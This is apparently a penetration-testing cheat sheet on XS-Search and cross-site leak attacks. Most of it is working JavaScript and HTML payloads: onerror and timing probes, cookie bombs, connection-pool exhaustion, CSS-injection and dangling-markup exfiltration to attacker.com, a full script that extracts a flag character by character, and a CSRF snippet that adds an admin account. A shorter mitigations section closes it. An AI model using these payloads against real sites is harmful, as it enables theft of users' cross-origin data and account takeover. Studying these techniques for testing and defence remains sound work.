## 🎯 Overview & Theory

**XS-Search (Cross-Site Search)** and **XS-Leaks (Cross-Site Leaks)** are powerful side-channel attack techniques that extract sensitive cross-origin information by exploiting browser behaviors and observable differences in web application states.

### Core Concept

Instead of directly accessing protected data, attackers **infer information** by observing:

- **Timing differences** (load times, execution delays)
- **State changes** (redirects, cache status, error events)
- **Browser API behaviors** (Performance API, History API, Frame counting)
- **Resource characteristics** (content length, status codes, headers)

### Key Components

1. **Vulnerable Web**: Target site containing sensitive data
2. **Attacker's Web**: Malicious site hosting the exploit
3. **Inclusion Method**: How the target is embedded (iframe, fetch, script tag, pop-up)
4. **Leak Technique**: Method to detect state differences (timing, error events, API abuse)
5. **Observable States**: Two distinguishable conditions (logged in/out, data present/absent)
6. **Detectable Differences**: Measurable variations (status codes, timing, redirects, content)

---

## 🔬 Exploitation Methods

### 1️⃣ **Event Handler Techniques**

#### **Onload/Onerror Leaks**

**Detection Target:** Status codes (2xx vs 4xx/5xx)  
**Inclusion:** Frames, HTML elements (`<img>`, `<script>`, `<object>`, `<audio>`)

```html
<!-- Method 1: Dynamic JS Injection -->
<script>
  let img = document.createElement('img');
  img.src = 'https://target.com/sensitive-resource';
  img.onload = () => fetch('https://attacker.com/log?status=success');
  img.onerror = () => fetch('https://attacker.com/log?status=error');
  document.body.appendChild(img);
</script>

<!-- Method 2: Scriptless Fallback -->
<object data="//target.com/404">
  <object data="//attacker.com/?error"></object>
</object>
```

**Advanced: Cookie Bomb + Onerror**  
Combine with cookie inflation to trigger server errors:

```javascript
// Step 1: Inflate cookies
for (let i = 0; i < 50; i++) {
  document.cookie = `cookie${i}=${'A'.repeat(3500)}; Domain=.target.com`;
}

// Step 2: Probe with script tag
let script = document.createElement('script');
script.src = 'https://target.com/search?q=SECRET_PREFIX';
script.onerror = () => console.log('Correct prefix found!');
document.head.appendChild(script);
```

---

#### **Onload Timing**

**Detection Target:** Page content differences via load time  
**Clock Options:** `performance.now()`, `PerformanceLongTaskTiming API`

```javascript
async function timeRequest(url) {
  let start = performance.now();
  await fetch(url, { mode: 'no-cors' });
  return performance.now() - start;
}

// Compare timings
let time1 = await timeRequest('https://target.com/search?q=flag{a');
let time2 = await timeRequest('https://target.com/search?q=flag{z');

if (time1 > time2 + 100) {
  console.log('First char likely "a"');
}
```

---

#### **Unload/Beforeunload Timing**

**Clock Required:** `SharedArrayBuffer` (high-resolution timing)

```javascript
// Start background worker
const worker = new Worker('timer-worker.js');
let start;

window.onbeforeunload = () => { start = Date.now(); };
window.onunload = () => {
  let duration = Date.now() - start;
  fetch(`https://attacker.com/log?time=${duration}`);
};

// Navigate to target
location.href = 'https://target.com/sensitive-page';
```

---

#### **Sandboxed Frame Timing**

**Purpose:** Measure network-only time (blocks JS execution)

```html
<iframe 
  src="https://target.com/resource" 
  sandbox 
  onload="console.log('Load time:', performance.now())">
</iframe>
```

---

### 2️⃣ **Global Limits Techniques**

#### **WebSocket Exhaustion (Firefox)**

**Detection:** Count active WebSocket connections

```javascript
async function detectWebSockets() {
  let maxSockets = 256;
  let sockets = [];
  
  // Open target in popup
  let win = window.open('https://target.com');
  await new Promise(r => setTimeout(r, 2000));
  
  // Exhaust sockets
  for (let i = 0; i < maxSockets; i++) {
    try {
      sockets.push(new WebSocket('wss://example.com'));
    } catch(e) {
      console.log(`Target uses ${i} WebSockets`);
      break;
    }
  }
}
```

---

#### **Payment API Leak**

**Detection:** Only one payment request allowed at a time

```javascript
function detectPayment() {
  let win = window.open('https://target.com/checkout');
  
  setInterval(() => {
    try {
      new PaymentRequest([{supportedMethods: 'basic-card'}], {total: {label:'', amount:{value:'1',currency:'USD'}}}).show();
    } catch(e) {
      fetch('https://attacker.com/log?payment_active=true');
    }
  }, 500);
}
```

---

#### **Connection Pool Exhaustion**

**Detection:** Time-based oracle using socket limits

```javascript
const SOCKET_LIMIT = 255;
const TARGET = 'https://target.com/search?q=';

async function leak(query) {
  // Block 255 sockets
  let controllers = [];
  for (let i = 0; i < SOCKET_LIMIT; i++) {
    let controller = new AbortController();
    fetch(`https://${i}.sleepserver.com/sleep/60`, {
      mode: 'no-cors',
      signal: controller.signal
    });
    controllers.push(controller);
  }
  
  // Open target page
  window.open(TARGET + query, 'pwn');
  await new Promise(r => setTimeout(r, 500));
  
  // Time requests to same origin
  let start = performance.now();
  await Promise.all([
    fetch('https://target.com', {mode: 'no-cors'}),
    fetch('https://target.com', {mode: 'no-cors'}),
    fetch('https://target.com', {mode: 'no-cors'}),
  ]);
  let delta = performance.now() - start;
  
  // Cleanup
  controllers.forEach(c => c.abort());
  
  return delta > 250; // Threshold indicates injected HTML loaded
}
```

---

### 3️⃣ **Performance API Techniques**

#### **Error Leak (No Entry Created)**

```javascript
async function detectError(url) {
  let iframe = document.createElement('iframe');
  iframe.src = url;
  document.body.appendChild(iframe);
  
  await new Promise(r => setTimeout(r, 1000));
  
  let entries = performance.getEntriesByName(url);
  return entries.length === 0; // Error = no entry
}
```

---

#### **X-Frame-Options Detection**

```javascript
function detectXFO(url) {
  let frame = document.createElement('iframe');
  frame.src = url;
  document.body.appendChild(frame);
  
  setTimeout(() => {
    let entries = performance.getEntriesByName(url);
    if (entries.length === 0) {
      console.log('X-Frame-Options present');
    }
  }, 1000);
}
```

---

#### **Redirect Detection (Chrome)**

```javascript
async function detectRedirect(url) {
  await fetch(url, {mode: 'no-cors'});
  let entries = performance.getEntriesByName(url);
  
  if (entries[0].duration < 0) {
    console.log('Redirect occurred');
  }
}
```

---

#### **CORP Detection**

```javascript
function detectCORP(url) {
  fetch(url).catch(() => {
    console.log('CORP header present (blocked)');
  });
}
```

---

### 4️⃣ **Error Messages Techniques**

#### **Media Error Leak (Firefox)**

```html
<audio id="audio"></audio>
<script>
  let audio = document.getElementById('audio');
  audio.src = 'https://target.com/resource';
  
  audio.onerror = function() {
    let msg = this.error.message;
    if (msg.includes('Failed to init decoder')) {
      console.log('Status: 200 OK');
    } else {
      console.log('Status: Error');
    }
  };
</script>
```

---

#### **CORS Error Leak (Safari)**

```javascript
fetch('https://target.com/redirect', {
  mode: 'cors',
  credentials: 'include'
}).catch(err => {
  // Error message leaks redirect URL
  console.log(err.message);
});
```

---

#### **SRI Error Size Leak (Safari)**

```html
<script 
  src="https://target.com/api/user" 
  integrity="sha256-INVALID_HASH" 
  crossorigin="anonymous"
  onerror="console.log(event.message)">
</script>
```

---

#### **CSP Violation Leak**

```javascript
// Set CSP to only allow target.com
let meta = document.createElement('meta');
meta.httpEquiv = 'Content-Security-Policy';
meta.content = "default-src https://target.com";
document.head.appendChild(meta);

// Listen for violations
document.addEventListener('securitypolicyviolation', e => {
  console.log('Redirect target:', e.blockedURI);
});

// Open target that might redirect
window.open('https://target.com/check-auth');
```

---

### 5️⃣ **Readable Attributes Techniques**

#### **Frame Counting**

```javascript
let win = window.open('https://target.com');
setTimeout(() => {
  console.log('Number of iframes:', win.length);
  win.close();
}, 2000);
```

---

#### **History Length Leak**

```javascript
let initialLength = history.length;
let win = window.open('https://target.com');

setTimeout(() => {
  win.location = 'about:blank';
  setTimeout(() => {
    let leaked = win.history.length - initialLength;
    console.log('Redirects detected:', leaked);
  }, 500);
}, 2000);
```

---

#### **COOP Detection**

```javascript
let win = window.open('https://target.com');
setTimeout(() => {
  if (win.opener === null) {
    console.log('COOP header present');
  }
}, 1000);
```

---

#### **URL Max Length (Client-Side - Chrome 2MB limit)**

```javascript
async function leak(char) {
  let url = 'https://target.com/search?q=flag{' + char;
  url += '#' + 'A'.repeat(2 * 1024 * 1024 - url.length - 2);
  
  let win = window.open(url);
  await new Promise(r => setTimeout(r, 100));
  
  try {
    win.origin; // Throws error if cross-origin
    return false;
  } catch {
    return true; // about:blank#blocked loaded (hit 2MB limit)
  }
}
```

---

### 6️⃣ **Timing-Based Techniques**

#### **Event Loop Blocking**

```javascript
// Measure execution time by blocking event loop
function measureExecution() {
  let start = performance.now();
  
  // Create blocking task
  for (let i = 0; i < 1e7; i++) {}
  
  return performance.now() - start;
}
```

---

#### **Service Worker Timing**

```javascript
// Register service worker
navigator.serviceWorker.register('/sw.js');

// sw.js
self.addEventListener('fetch', event => {
  let start = Date.now();
  event.respondWith(
    fetch(event.request).then(response => {
      let duration = Date.now() - start;
      fetch(`https://attacker.com/log?time=${duration}`);
      return response;
    })
  );
});
```

---

#### **Cache Timing (Fetch + AbortController)**

```javascript
async function isCached(url) {
  let controller = new AbortController();
  let timeout = setTimeout(() => controller.abort(), 10); // 10ms
  
  try {
    await fetch(url, { signal: controller.signal });
    clearTimeout(timeout);
    return true; // Loaded within 10ms = cached
  } catch {
    return false; // Took too long = not cached
  }
}
```

---

### 7️⃣ **HTML/CSS Injection Techniques**

#### **Dangling Markup**

```html
<!-- Steal content until next quote -->
<img src='https://attacker.com/log?data=

<!-- OR use meta refresh -->
<meta http-equiv="refresh" content='0; url=https://attacker.com/log?data=
```

---

#### **CSS Injection**

```html
<style>
  @import url("https://attacker.com/start?");
  
  /* Leak prefix character */
  input[value^="f"] { background: url("https://attacker.com/leak?pre=f"); }
  input[value^="l"] { background: url("https://attacker.com/leak?pre=l"); }
  
  /* Leak suffix character */
  input[value$="g"] { border-image: url("https://attacker.com/leak?post=g"); }
  input[value$="}"] { border-image: url("https://attacker.com/leak?post=}"); }
  
  /* Complete match */
  input[value="flag{secret}"] { 
    list-style: url("https://attacker.com/end?flag=flag{secret}"); 
  }
</style>
```

---

#### **Lazy Image Loading**

```html
<!-- Add junk to push secret below viewport -->
<canvas height="3350px"></canvas>
<br>

<!-- Lazy images only load if visible -->
<img loading="lazy" src="/resource?1">
<img loading="lazy" src="/resource?2">

<script>
  // If secret is ABOVE injection, images load
  // If secret is BELOW injection, images don't load
  setTimeout(() => {
    let start = performance.now();
    fetch('/resource?1').then(() => {
      let time = performance.now() - start;
      if (time < 100) {
        console.log('Image was cached = loaded = secret ABOVE');
      }
    });
  }, 2000);
</script>
```

---

#### **ReDoS (Regular Expression Denial of Service)**

```javascript
// If jQuery uses location.hash for selectors
location.hash = '#' + '*:has(*) '.repeat(20) + "main[id='target']";

// Measure time - if selector matches, takes longer
let start = performance.now();
$(location.hash);
let time = performance.now() - start;

if (time > 1000) {
  console.log('Element exists!');
}
```

---

### 8️⃣ **Advanced Exploitation Examples**

#### **Full Flag Extraction (Connection Pool)**

```html
<form id="create" method="POST" action="https://target.com/create" target="_blank">
  <input name="text" id="payload">
</form>

<form id="remove" method="POST" action="https://target.com/remove" target="_blank">
  <input name="index" value="0">
</form>

<script>
const WEBHOOK = 'https://attacker.com/';
const sleep = ms => new Promise(r => setTimeout(r, ms));
let flag = 'flag{';
let charset = 'abcdefghijklmnopqrstuvwxyz0123456789_}';

async function leak(char) {
  // Inject HTML with images
  let payload = flag + char;
  for (let i = 0; payload.length < 2048; i++) {
    payload += `<img src=/js/purify.js?${i.toString(36)}>`;
  }
  
  document.getElementById('payload').value = payload;
  document.getElementById('create').submit();
  await sleep(1000);
  
  document.getElementById('remove').submit();
  await sleep(500);
  
  // Block 255 sockets
  let controllers = [];
  for (let i = 0; i < 255; i++) {
    let c = new AbortController();
    fetch(`https://${i}.sleep.com/60`, {mode:'no-cors', signal:c.signal});
    controllers.push(c);
  }
  
  window.open('https://target.com/', 'pwn');
  await sleep(500);
  
  // Time requests
  let start = performance.now();
  await Promise.all([
    fetch('https://target.com', {mode:'no-cors'}),
    fetch('https://target.com', {mode:'no-cors'}),
    fetch('https://target.com', {mode:'no-cors'}),
  ]);
  let delta = performance.now() - start;
  
  controllers.forEach(c => c.abort());
  
  navigator.sendBeacon(WEBHOOK + '?char=' + char + '&time=' + delta);
  return delta > 250;
}

(async () => {
  for (let char of charset) {
    if (await leak(char)) {
      flag += char;
      navigator.sendBeacon(WEBHOOK + '?flag=' + flag);
      if (char === '}') break;
    }
  }
})();
</script>
```

---

#### **JavaScript Execution Leak**

```html
<iframe id="frame"></iframe>
<script>
let flag = 'flag{';
let charset = 'abcdefghijklmnopqrstuvwxyz_}';
let candidateIsGood = true;

function foo() {
  candidateIsGood = false; // Called if guess is wrong
}

setInterval(() => {
  if (candidateIsGood) {
    flag += currentChar;
    fetch('https://attacker.com/log?flag=' + flag);
  }
  
  candidateIsGood = true;
  currentChar = charset[guessIndex++];
  
  // Inject page with script that calls foo() if wrong
  frame.src = `/guess?query=${flag}${currentChar}&callback=parent.foo()`;
}, 500);
</script>
```

---

## 🛡️ Bypasses

### **CSP Bypass via Cookie Bomb**

```javascript
// Set cookies from first-party context (open popup)
let win = window.open('https://target.com');
setTimeout(() => {
  for (let i = 0; i < 40; i++) {
    win.document.cookie = `c${i}=${'X'.repeat(4000)}`;
  }
  win.close();
}, 1000);

// Now trigger error with bloated headers
setTimeout(() => {
  let script = document.createElement('script');
  script.src = 'https://target.com/search?q=secret_prefix';
  script.onerror = () => console.log('431 error = correct prefix!');
  document.head.appendChild(script);
}, 3000);
```

---

### **Bypass Site Isolation (Busy Event Loop)**

```javascript
// Measure execution time across origins
function busyWait(ms) {
  let end = Date.now() + ms;
  while (Date.now() < end) {}
}

let start = performance.now();
busyWait(1000);
let duration = performance.now() - start;

// If duration > 1000ms, other origin was executing code
```

---

### **Bypass Framing Protection (Portal Tag)**

```html
<portal id="p" src="https://target.com"></portal>
<script>
  p.addEventListener('load', () => {
    console.log('Page loaded in portal');
  });
</script>
```

---

## 🎯 Higher Impact Scenarios

### **1. Account Takeover via Search Timing**

If login status affects search results size:

```javascript
// Check if admin is logged in
let time = await timeRequest('https://target.com/admin/search?q=');
if (time > 500) {
  // Admin logged in → launch CSRF attack
  let form = document.createElement('form');
  form.method = 'POST';
  form.action = 'https://target.com/admin/add-user';
  form.innerHTML = '<input name="username" value="attacker"><input name="role" value="admin">';
  document.body.appendChild(form);
  form.submit();
}
```

---

### **2. 2FA Bypass Detection**

```javascript
// Detect if 2FA is enabled
let win = window.open('https://target.com/settings');
setTimeout(() => {
  if (win.history.length > 1) {
    console.log('2FA enabled (redirect occurred)');
  }
  win.close();
}, 2000);
```

---

### **3. Private Data Exfiltration**

```javascript
// Leak email character-by-character
let email = '';
let chars = 'abcdefghijklmnopqrstuvwxyz@.';

for (let char of chars) {
  let found = await leak(`${email}${char}`);
  if (found) {
    email += char;
    if (char === '.') break; // End marker
  }
}
```

---

## 🔒 Mitigations

### **Server-Side Defenses**

#### **1. Uniform Response Behavior**

```http
# Always return same status/size regardless of state
HTTP/1.1 200 OK
Content-Length: 1024
```

```javascript
// Backend example
app.get('/search', (req, res) => {
  let results = db.search(req.query.q);
  
  // Pad response to constant size
  let json = JSON.stringify(results);
  let padding = 'X'.repeat(10000 - json.length);
  
  res.send(json + padding);
});
```

---

#### **2. SameSite Cookies**

```http
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

---

#### **3. Fetch Metadata Request Headers**

```javascript
app.use((req, res, next) => {
  let site = req.get('Sec-Fetch-Site');
  let mode = req.get('Sec-Fetch-Mode');
  
  if (site === 'cross-site' && mode === 'no-cors') {
    return res.status(403).send('Blocked');
  }
  next();
});
```

---

#### **4. CORP/COOP/COEP Headers**

```http
Cross-Origin-Resource-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
```

---

#### **5. Frame Protections**

```http
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'
```

---

### **Client-Side Defenses**

#### **1. Disable Partitioned Cache (if needed)**

```javascript
// Force no-cache for sensitive resources
fetch('/api/user', {
  cache: 'no-store',
  credentials: 'include'
});
```

---

#### **2. Limit Performance API Exposure**

```javascript
// Clear performance entries
performance.clearResourceTimings();
performance.setResourceTimingBufferSize(0);
```

---

#### **3. Randomize Response Timing**

```javascript
app.get('/api', async (req, res) => {
  let data = await getData();
  
  // Add random delay
  let delay = Math.random() * 100;
  await new Promise(r => setTimeout(r, delay));
  
  res.json(data);
});
```

---

## 📚 Tools & Resources

### **XSinator**

Automated XS-Leak testing tool: https://xsinator.com/

### **Key Papers**

- XSinator Research: https://xsinator.com/paper.pdf
- XS-Leaks Wiki: https://xsleaks.dev/

### **Detection Wordlist**

- Automated payload list: https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt

---

## 🚀 Pro Tips

1. **Combine Techniques**: Stack multiple leaks (e.g., cookie bomb + timing + connection pool)
2. **Calibration is Key**: Always baseline normal vs anomalous timings
3. **Binary Search**: Use binary search instead of linear when guessing chars
4. **Cache Everything**: Pre-load resources to eliminate network noise
5. **Parallel Requests**: Send multiple probes simultaneously for speed
6. **Monitor Browser Updates**: Many leaks are browser-specific and get patched

---

## ⚠️ Final Notes

**XS-Leaks are subtle but powerful.** They bypass SOP without exploiting traditional vulnerabilities like XSS. Always test in **headless browsers** (some techniques behave differently) and remember:

- **Every millisecond counts** in timing attacks
- **State must be distinguishable** (different status codes, redirects, content sizes)
- **Modern browsers add noise** (randomized timings, partitioned caches)
- **Legal boundaries**: Only test on authorized targets

**Stay curious, stay ethical, and happy hunting!** 🎯